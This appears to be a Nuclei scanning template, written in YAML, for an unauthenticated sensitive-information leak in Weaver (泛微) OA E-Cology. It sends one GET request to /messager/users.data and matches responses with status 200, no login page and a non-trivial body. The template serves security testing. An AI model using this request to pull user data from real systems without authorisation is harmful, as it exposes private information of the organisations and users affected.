id: fanweiOA-E-Cology-users_data-information-leak

info:
  name: 泛微OA E-Cology users.data 敏感信息泄漏
  author: cnaq  
  severity: medium
  description: 泛微OA E-Cology users.data 允许任意用户下载，获取OA中的敏感信息
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20users.data%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F.html
  tags: fanwei,oa,ecology,leak


requests:
  - raw:
      - |
        GET /messager/users.data HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "Login.jsp"
        part: body
        negative: true

      - type: dsl
        dsl:
          - 'len(body)>=32'


    

